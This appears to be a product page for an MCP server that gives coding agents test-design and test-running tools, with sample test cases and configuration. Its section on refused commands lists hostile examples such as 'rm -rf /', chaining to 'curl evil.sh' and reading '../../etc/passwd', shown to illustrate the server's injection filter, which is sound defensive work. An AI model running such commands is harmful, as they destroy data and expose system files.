Universal QA Expert Engine MCP Skill

Your coding agent can already run the test suite. It can’t design one. This server gives it the methodology — boundary analysis, equivalence partitioning, decision tables, state machines — and a sandbox to execute in.

$ npx -y mcp-qa-expert-engine
Add to your agent

Why not just ask the agent?

You can. The results depend entirely on how rigorously you phrase the request, and they change every time you ask. Three things shift when the methodology is a tool schema instead of a prompt.

Consistent rigour
A schema can’t forget the upper boundary. Every call produces the same classes of case — min, max, the values either side, type violations, null states — whoever is driving and however they phrase it.
Works in every editor
Built on the open Model Context Protocol, so the same QA behaviour runs in Claude Code, Cursor, VS Code, Antigravity and Codex. Nothing is tied to one vendor’s execution loop.
A guarded path to your shell
Test commands routed through this server are tokenised and run without a shell, confined to the workspace. Injection and directory traversal are refused before anything executes.

What it looks like in your editor

You never call these tools yourself. You talk to your agent the way you already do, and it picks the right one from the schema. Here is a promo-code feature going from written to tested.

The code you just wrote 
function applyPromoCode(code, orderTotal, tier) {
  // code: 6-12 characters
  // orderTotal: min 0.01, max 10000
  // tier one of: bronze, silver, gold
}
  1. 1 “Design tests for applyPromoCode” generate_qa_matrix

    It reads the constraints out of your comments and types every parameter:

    | # | Parameter  | Inferred Type | Constraints                              |
|---|------------|---------------|------------------------------------------|
| 1 | code       | string        | minLength=6, maxLength=12                |
| 2 | orderTotal | number        | min=0.01, max=10000                      |
| 3 | tier       | enum          | enum=[bronze|silver|gold]                |

    Then writes the cases — each one atomic, with pre-conditions, steps and a status field:

    TC_PROMO_001  Verify code is rejected at lower boundary (empty string)
TC_PROMO_002  Verify code is rejected at lower boundary (single character)
TC_PROMO_003  Verify code is rejected at lower boundary (minLength - 1)
TC_PROMO_004  Verify code is accepted at lower boundary (minLength)
TC_PROMO_005  Verify code is accepted at upper boundary (maxLength - 1)
TC_PROMO_006  Verify code is accepted at upper boundary (maxLength)
TC_PROMO_007  Verify code is rejected at upper boundary (maxLength + 1)

    35 cases from three parameters — plus equivalence partitions and six exploratory charters for a human tester. That is the part nobody writes by hand.

  2. 2 “Write a Playwright test for the checkout flow” generate_automation_script 
    // ─── file: pages/CheckoutPage.js ───
export class CheckoutPage {
  constructor(page) {
    this.promoCode = page.getByTestId("promo-code");
    this.orderTotal = page.getByTestId("order-total");
  }

  /** Step 1: user enters a promo code */
  async fillPromoCode(value) {
    await this.promoCode.fill(value);
  }
}

    Ask for full coverage and it also emits data-driven cases, a responsive and visual-regression spec, component state tests, an axe accessibility spec and a Gherkin feature file. Waits are always condition-based, never a fixed sleep.

Configure it by hand instead

For Cursor, Antigravity, Codex, or any other MCP client. Add this to the server block your editor uses — commonly .cursor/mcp.json, .vscode/mcp.json, or the MCP panel in your extension.

mcp.json 
{
  "mcpServers": {
    "qa-expert": {
      "command": "npx",
      "args": ["-y", "mcp-qa-expert-engine"]
    }
  }
}

Restart the editor afterwards — most clients only read MCP config at startup. Then ask “what QA tools do you have?” and you should see eight.

Updating. Restart your editor and you get the latest release — the server is a long-lived process, so a new version is only picked up when it restarts. Check which one you are on in your editor’s MCP log: it announces QA Expert MCP Server v1.3.0 on startup. Prefer a fixed build? Append @1.3.0 to the package name and bump it deliberately.

Eight tools, grouped by when you reach for them

Your agent picks the right one from the schema. Parameters marked required must be supplied; the rest have sensible defaults.

Design the tests

generate_qa_matrix

Reads a function signature, TypeScript interface, git diff or markdown requirement list. Understands numeric ranges, length ranges, exact lengths and enum unions. Returns boundary value cases, equivalence partitions, a decision table, a state transition model and exploratory charters — and flags any parameter whose boundary the specification never stated, rather than inventing one.

codeSnippet
required

generate_manual_test_plan

A plan a human can execute: environment setup, happy path, negative and boundary passes, contextual edge cases, timeboxed exploratory charters, a defect template and exit criteria.

Run it and read the wreckage

run_local_test_suite

Runs your suite and hands back status, exit code, duration and the full output. A failing suite comes back as a readable result your agent can diagnose, not a crash. Bounded at five minutes and 10 MB.

command
required

parse_error_logs

Turns a raw stack trace into a defect record: error class, severity, the first frame that is actually your code, environment details pulled from the log, repro steps and fix suggestions. Can render straight to Jira markup.

Plan the programme

generate_test_strategy

Reads your project context — domain, scale, compliance regime — and writes the strategy: pyramid allocation, which test types at what cadence, a non-functional plan covering load through accessibility, release gates, CI policy, exit criteria, closure metrics, and an honest statement of what it does not cover.

required

What it will refuse to run

run_local_test_suite executes real commands on your machine, so it is the one tool with teeth. Commands are tokenised into an argument array and run with no shell at all, which makes injection structurally impossible rather than filtered. A sanitiser still runs first.

Refused before anything executes

  • ×npm test; rm -rf /shell metacharacter
  • ×npm test && curl evil.shcommand chaining
  • ×npm test $(whoami)substitution
  • ×sudo rm -rf .destructive token
  • ×pytest ../../etc/passwdescapes the workspace

Permitted runners

npm · npx · yarn · pnpm · bun · node · python · python3 · pytest · jest · vitest · mocha · playwright · cypress

  • Paths confined to the workspace, symlinks resolved.
  • Five minute timeout, 10 MB output buffer.
  • Subprocess output is captured, never piped to the protocol stream.

To be precise about the boundary: these rules govern commands routed through this server. They are not a sandbox around your agent — if it has its own shell access, that is unaffected. What they guarantee is that QA execution requested through these tools cannot be turned into arbitrary shell execution.

On Windows this one tool runs through cmd.exe, because npm and yarn resolve to .cmd shims that Node will not spawn without a shell. The sanitizer rejects every cmd.exe metacharacter first, so no command separator reaches the shell — but there the protection is the filter rather than the absence of a shell. Windows behaviour has not yet been verified on a Windows host.

Before you install

Runtime

Node.js 18 or newer. Nothing else to install — the package ships one dependency, the MCP SDK.

Clients

Any MCP-compatible editor: Claude Code, Cursor, VS Code, Antigravity, Codex.

Workspace

Start the server from your project root. That directory becomes the boundary every path is checked against.

Verification

135 checks cover the protocol, all eight tools, and every injection and traversal case shown above.

If the server doesn’t appear

  • No tools listed. Restart the editor — most clients only read MCP config at startup.
  • Command not found. Check node --version reports 18 or higher and that npx is on your PATH.
  • A command was refused. That is the sanitiser. Send a single runner invocation with no chaining or redirection.
  • Still on an old version? Restart the editor first. If it persists, npx is serving a cached install — clear it with npm cache clean --force.
  • Want to see it directly? Run npx -y mcp-qa-expert-engine in a terminal; it reports its version and tool count on stderr and waits for JSON-RPC on stdin.
